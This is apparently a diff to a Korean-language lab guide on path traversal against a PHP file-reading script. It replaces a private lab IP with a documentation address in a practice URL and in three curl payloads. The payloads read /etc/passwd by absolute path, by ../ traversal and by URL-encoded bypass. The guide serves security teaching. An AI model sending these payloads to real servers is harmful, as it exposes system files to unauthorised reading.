@@ -64,7 +64,7 @@ echo file_get_contents($file);
 ### 실습 URL
 
 ```
-http://10.200.101.182/file_read.php
+http://192.0.2.182/file_read.php
 ```
 
 ### 테스트 입력
@@ -83,13 +83,13 @@ http://10.200.101.182/file_read.php
 
 ```bash
 # 절대 경로
-curl "http://10.200.101.182/file_read.php?file=/etc/passwd"
+curl "http://192.0.2.182/file_read.php?file=/etc/passwd"
 
 # 상대 경로 (traversal)
-curl "http://10.200.101.182/file_read.php?file=../../../etc/passwd"
+curl "http://192.0.2.182/file_read.php?file=../../../etc/passwd"
 
 # URL 인코딩 우회
-curl "http://10.200.101.182/file_read.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+curl "http://192.0.2.182/file_read.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
 ```
 
 ### 인코딩 우회 기법
